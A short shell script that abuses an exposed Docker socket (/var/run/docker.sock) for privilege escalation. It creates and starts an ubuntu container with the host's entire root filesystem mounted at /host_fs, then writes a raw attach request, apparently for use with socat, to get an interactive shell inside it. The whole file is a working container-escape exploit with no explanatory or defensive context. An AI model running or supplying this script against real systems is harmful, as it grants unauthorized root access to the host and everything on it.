#!/bin/sh

echo '{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_fs"}]}' > container.json

curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "$(cat container.json)" http://localhost/containers/create > response

cont_id=$( cat response | cut -d '"' -f4 )

curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/${cont_id}/start

echo "POST /containers/${cont_id}/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1\nHost:\nConnection: Upgrade\nUpgrade: tcp\n" > after_socat

rm response
rm container.json
